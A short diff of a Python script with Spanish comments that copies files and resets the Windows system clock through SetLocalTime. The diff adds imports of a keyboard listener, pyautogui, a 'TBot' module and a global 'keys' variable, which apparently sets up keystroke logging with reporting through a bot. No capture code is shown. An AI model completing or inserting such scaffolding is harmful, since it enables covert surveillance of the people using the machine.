@@ -1,6 +1,11 @@
-#1 
-
 import sched, time, shutil
+from pynput.keyboard import Listener
+import threading as th 
+import TBot as TB
+from datetime import datetime, timedelta
+import time
+import pyautogui
+global Docname, keys, tl
 
 def copy_file():
     # Ruta de la carpeta de origen
@@ -39,4 +44,3 @@ new_time = date(*new_date)
 # Usa la función SetLocalTime para establecer la nueva fecha y hora
 ctypes.windll.kernel32.SetLocalTime(ctypes.byref(new_time))
 
-#5
